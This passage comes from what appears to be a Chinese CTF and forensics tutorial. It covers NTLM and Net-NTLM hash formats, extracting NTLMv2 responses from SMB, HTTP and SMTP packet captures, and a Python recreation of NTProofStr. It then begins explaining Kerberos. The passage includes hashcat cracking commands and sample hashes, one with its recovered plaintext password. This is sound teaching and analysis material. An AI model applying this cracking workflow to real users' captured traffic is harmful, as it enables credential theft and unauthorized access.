<a href=#net-ntlm-hash-%e4%b8%8e%e5%93%8d%e5%ba%94%e7%b1%bb%e5%9e%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>在NTLM认证的Type 3消息中，客户端可能发送六种不同类型的响应，其演变历程体现了微软在安全性上的不断改进：</p><ul><li><p>LM响应：最古老的响应类型，由早期客户端使用，安全性极低。</p></li><li><p>NTLM v1响应：由Windows NT、2000、XP等客户端发送，取代了LM响应。</p></li><li><p>NTLM v2响应：从Windows NT SP4引入的更安全响应，在现代系统中取代NTLM v1响应。</p></li><li><p>LM v2响应：NTLMv2协议中用于替代LM响应的版本。</p></li><li><p>NTLM2会话响应：一种折中方案，在不使用完整NTLMv2认证时，也能增强会话安全性。</p></li><li><p>匿名响应：用于建立匿名上下文，不进行真正的身份验证。</p></li></ul><p>所有这些响应类型都基于Challenge/Response机制，其根本区别在于使用的加密算法和对Challenge的处理方式不同。</p><h4 class=heading-element id=net-ntlm-hash-的格式><span>Net-NTLM Hash 的格式</span>
<a href=#net-ntlm-hash-%e7%9a%84%e6%a0%bc%e5%bc%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><blockquote><p>NTLM v1 和 NTLMv2 响应分别对应 Net-NTLM Hash v1 和 Net-NTLM Hash v2</p></blockquote><ul><li><p>Net-NTLM Hash v1：<code>username::hostname:LM response:NTLM response:challenge</code></p><p>状态：已废弃，因存在严重安全缺陷，只要获取到 Net-NTLMv1，即可轻易破解出原始 NTLM Hash，与密码强度无关。</p></li><li><p>Net-NTLM Hash v2：<code>username::domain:challenge:HMAC-MD5:blob</code></p><p>状态：当前推荐使用的、更安全的版本。</p></li></ul><h4 class=heading-element id=net-ntlm-hash-的生成流程><span>Net-NTLM Hash 的生成流程</span>
<a href=#net-ntlm-hash-%e7%9a%84%e7%94%9f%e6%88%90%e6%b5%81%e7%a8%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><ol><li><p>Net-NTLMv1 的生成（两种方法）</p><ul><li><p>共同前置步骤：</p><pre><code>  获取用户密码的 NT Hash。
  在 NT Hash 后补 5 个字节的 0，使其变为 21 字节。
  将这 21 字节分成 3 组（每组 7 字节），并将每组 7 比特数据后添加 1 比特 0，构成 3 个 8 字节的 DES 密钥。
</code></pre></li><li><p>方法一（未协商会话安全）：</p><pre><code>  使用上面得到的 3 个 DES 密钥，直接对 8 字节的 Server Challenge 进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。
</code></pre></li><li><p>方法二（已协商 NTLMv2 会话安全）：</p><pre><code>  拼接 8 字节的 Server Challenge 和 8 字节的 Client Challenge。
  计算这个 16 字节数据的 MD5 散列值，并取前 8 字节。
  使用前面得到的 3 个 DES 密钥，分别对这个 8 字节数据进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。
</code></pre></li></ul></li><li><p>Net-NTLMv2 的生成</p><p>计算 NTLMv2 Hash：</p><pre><code> 将大写用户名（Unicode 编码）与认证目标（Type 3 消息中的 TargetName，如域名，区分大小写）拼接。

 以用户的 16 字节 NT Hash 为密钥，使用 HMAC-MD5 算法对上述拼接字符串进行加密，得到 16 字节的 NTLMv2 Hash。
</code></pre><p>构建 Blob：</p><pre><code> 一个包含时间戳、客户端挑战、目标信息等数据的结构。
</code></pre><p>计算 NTProofStr：</p><pre><code> 将来自 Type 2 消息的 Server Challenge 与步骤 2 构建的 Blob 拼接。

 以步骤 1 得到的 NTLMv2 Hash 为密钥，使用 HMAC-MD5 算法对拼接后的数据进行加密，得到 16 字节的 NTProofStr。
</code></pre><p>生成最终 Response：</p><pre><code> 将 NTProofStr 和 Blob 拼接起来，形成最终的响应。
</code></pre></li></ol><h4 class=heading-element id=lmcompatibilitylevellan-管理器身份验证级别><span>LmCompatibilityLevel（LAN 管理器身份验证级别）</span>
<a href=#lmcompatibilitylevellan-%e7%ae%a1%e7%90%86%e5%99%a8%e8%ba%ab%e4%bb%bd%e9%aa%8c%e8%af%81%e7%ba%a7%e5%88%ab class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><blockquote><p>这个安全策略决定了客户端在 NTLM 认证中 使用哪种响应类型，以及服务器 接受哪种响应类型。不匹配的设置会导致认证失败。</p></blockquote><table><thead><tr><th>级别值</th><th>客户端行为（发送什么）</th><th>服务器行为（接受什么）</th></tr></thead><tbody><tr><td>0 - 发送 LM & NTLM 响应</td><td>只发送 LM 和 NTLMv1 响应。</td><td>接受 LM, NTLM, NTLMv2。</td></tr><tr><td>1 - 使用 NTLMv2 会话安全</td><td>发送 LM 和 NTLMv1 响应，但会尝试协商 NTLMv2 会话安全。</td><td>接受 LM, NTLM, NTLMv2。</td></tr><tr><td>2 - 仅发送 NTLM 响应</td><td>只发送 NTLMv1 响应。</td><td>接受 LM, NTLM, NTLMv2。</td></tr><tr><td>3 - 仅发送 NTLMv2 响应</td><td>只发送 NTLMv2 和 LMv2 响应。</td><td>接受 LM, NTLM, NTLMv2。</td></tr><tr><td>4 - 仅发送 NTLMv2/拒绝 LM</td><td>只发送 NTLMv2 和 LMv2 响应。</td><td>拒绝 LM，只接受 NTLM 和 NTLMv2。</td></tr><tr><td>5 - 仅发送 NTLMv2/拒绝 LM & NTLM</td><td>只发送 NTLMv2 和 LMv2 响应。</td><td>拒绝 LM 和 NTLM，只接受 NTLMv2。</td></tr></tbody></table><p>NTLMv2流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包</p><p>可以在Wireshark中用关键字 ntlmssp 过滤，然后在成功认证的流量包的分组详情中提取我们需要的字段</p><p>当然也可以用这个<a href=https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/NTLMRawUnHide.py target=_blank rel="external nofollow noopener noreferrer">开源项目</a>中的脚本自动识别并提取</p><p><img loading=lazy src=/posts/5422d65/imgs/%E5%9B%BE%E7%89%87.webp alt=/posts/5422d65/imgs/%E5%9B%BE%E7%89%87.webp height=2136 width=3280></p><h3 class=heading-element id=ntlmv2-认证的smb流量><span>NTLMv2 认证的SMB流量</span>
<a href=#ntlmv2-%e8%ae%a4%e8%af%81%e7%9a%84smb%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>1.过滤出ntlmssp的请求包，查看 Session Set Request 并复制NTLMSSP_AUTH包中Security Blob层的User name、Domain name</p><p>2.查看NTLMSSP_AUTH包中的NTLM响应，并复制出ntlmv2_response以及ntproofstr3</p><p>3.过滤出ntlmssp的请求包，查看Session Set Response 并复制出NTLM Server Challenge的值，通常这个数据包是在NTLM_Auth数据包之前</p><p>4.把以上内容按照固定格式组合并保存到hash.txt中</p><p><strong>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</strong></p><p>这里要注意ntlmv2response的开头就是NTproofstring，因此分开来组合</p><p>5.使用hashcat爆破hash值</p><p>.\hashcat -a 0 -m 5600 hash.txt .\rockyou.txt</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000</span></span></code></pre></td></tr></table></div></div><p>最后使用 hashcat 进行爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hashcat -m 5600 hash.txt rockyou.txt</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hashcat -m <span class=m>5600</span> hash.txt rockyou.txt --show
</span></span><span class=line><span class=cl>ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=ntlmv2-认证的http流量><span>NTLMv2 认证的HTTP流量</span>
<a href=#ntlmv2-%e8%ae%a4%e8%af%81%e7%9a%84http%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中
按照之前的步骤提取出来，然后 hashcat 爆破即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=ntlmv2-认证的stmp流量><span>NTLMv2 认证的STMP流量</span>
<a href=#ntlmv2-%e8%ae%a4%e8%af%81%e7%9a%84stmp%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：</p><p><img loading=lazy src=/posts/5422d65/imgs/N6.png alt=/posts/5422d65/imgs/N6.png height=1600 width=2560></p><p>后续步骤就和之前一样了，提取信息然后用 hashcat 爆破</p><p><strong>NTLMv2 中 NTproofstring 生成过程如下：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_name</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;QUICAUTH-CCC123!@#&#34;</span>
</span></span><span class=line><span class=cl><span class=n>domain_name</span> <span class=o>=</span> <span class=s2>&#34;SecretServer&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用MD4消息摘要算法得到16字节的 NTLM_HASH</span>
</span></span><span class=line><span class=cl><span class=n>ntlm_hash</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;md4&#34;</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;NTLM Hash: </span><span class=si>{</span><span class=n>ntlm_hash</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_domain_name</span> <span class=o>=</span> <span class=n>user_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span><span class=o>+</span><span class=n>domain_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;User Domain Data: </span><span class=si>{</span><span class=n>user_domain_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密</span>
</span></span><span class=line><span class=cl><span class=n>firstHMAC</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_hash</span><span class=p>),</span> <span class=n>user_domain_name</span><span class=p>,</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;First HMAC Result: </span><span class=si>{</span><span class=n>firstHMAC</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ntlm_authentication_data</span> <span class=o>=</span> <span class=s2>&#34;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NTproofstring</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>firstHMAC</span><span class=p>),</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_authentication_data</span><span class=p>),</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>NTproofstring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2</span>
</span></span><span class=line><span class=cl><span class=c1># User Domain Data: b&#39;A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74</span>
</span></span><span class=line><span class=cl><span class=c1># efa243f442b9d683eb1b00a2b1a0c9fc</span></span></span></code></pre></td></tr></table></div></div><p>例题1-2024数据安全产业人才积分争夺赛 Strangesystem</p><h2 class=heading-element id=kerberos认证流量分析><span>kerberos认证流量分析</span>
<a href=#kerberos%e8%ae%a4%e8%af%81%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=kerberos认证的基本概念><span>kerberos认证的基本概念</span>
<a href=#kerberos%e8%ae%a4%e8%af%81%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>Kerberos 是一种由麻省理工大学提出的网络身份验证协议，其设计目标是通过密钥加密技术为客户端与服务器应用程序提供强身份验证。该协议的认证过程不依赖于主机操作系统的认证机制，也不基于主机地址的信任关系，同时不要求网络中所有主机在物理上的绝对安全，并假设网络数据包可能被任意读取、修改或插入。在此背景下，Kerberos 作为可信任的第三方认证服务，依托传统的密码技术（如共享密钥）来执行身份验证。</p><p>在 Kerberos 协议中主要存在三个角色：</p><p>一是访问服务的客户端，即用户；</p><p>二是提供服务的服务器；</p><p>三是密钥分发中心，简称 KDC。</p><blockquote><p>KDC 通常默认安装在域环境的域控制器上，而客户端和服务器则可以是域内的用户或服务，例如 HTTP 服务或数据库服务。Kerberos 通过 KDC 签发票据来控制客户端是否有权限访问某一服务。</p></blockquote><h3 class=heading-element id=kerberos认证的完整流程><span>kerberos认证的完整流程</span>
<a href=#kerberos%e8%ae%a4%e8%af%81%e7%9a%84%e5%ae%8c%e6%95%b4%e6%b5%81%e7%a8%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>第一阶段：用户初始认证与 TGT 获取 (AS Exchange)</p><pre><code>1. AS-REQ (认证服务请求)

	客户端向密钥分发中心(KDC)的认证服务(AS)发送请求。
	
	客户端将其密码生成的哈希值作为密钥，加密一个当前时间戳，并将此加密后的时间戳作为认证因子发送给 KDC。

2. AS-REP (认证服务回复)

	KDC 从数据库中获取该用户的密码哈希，尝试解密时间戳。如果解密成功且时间戳在允许的时间偏差内，则验证通过。
	
	验证成功后，KDC 会创建一个票据授予票据(TGT)。这个 TGT 中包含一个关键结构——特权属性证书(PAC)，PAC 里记录了用户的安全标识符(SID)和所属组信息。
	
	KDC 使用自己的密钥(KDC Key)加密整个 TGT，然后将其发送回客户端。
	
	客户端收到加密的 TGT，但由于没有 KDC 的密钥，无法解密它，只能安全地保存起来。
</code></pre><p>第二阶段：申请访问特定服务的票据 (TGS Exchange)</p><pre><code>1. TGS-REQ (票据授予服务请求)

	当客户端需要访问某个特定服务（如文件共享、邮箱等）时，它会向 KDC 的票据授予服务(TGS)发起请求。
	
	请求中包含之前获得的 TGT（仍由 KDC 密钥加密）以及一个使用服务名称等信息生成的认证符。

2. TGS-REP (票据授予服务回复)

	KDC 验证 TGT 的有效性（通过解密并检查其有效性）。
	
	关键点：只要 TGT 有效，KDC 就会批准请求，而不会在此阶段判断用户是否有权访问该服务。
	
	KDC 会复制 TGT 中的 PAC 数据，并生成一个针对目标服务的服务票据(Service Ticket)。
	
	KDC 使用目标服务账户的密码哈希作为密钥来加密这个服务票据，然后将其发送给客户端。
</code></pre><p>第三阶段：访问服务与最终权限验证 (AP Exchange)</p><pre><code>1. AP-REQ (应用请求)

	客户端向目标服务程序发起访问请求。
	
	请求中提交之前获得的服务票据（由服务密码哈希加密）以及一个新的认证符。

2. AP-REP (应用回复) &amp; PAC 验证

	服务端使用自身的密码哈希来解密服务票据。如果解密成功，则证明票据是真实的KDC颁发的。
	
	服务端从解密后的票据中提取出 PAC 信息。
	
	为了确定用户的具体访问权限，服务端会将 PAC 发送给 KDC（具体是 KDC 的域控制器），请求查询该用户的最终权限。
	
	KDC 解密 PAC，读取其中的用户 SID 和组信息，再结合该服务资源的访问控制列表(ACL)，进行最终的权限判断。
	
	KDC 将权限判定结果返回给服务端。
	
	服务端根据这个结果决定是批准还是拒绝客户端的访问，从而完成整个认证与授权流程。
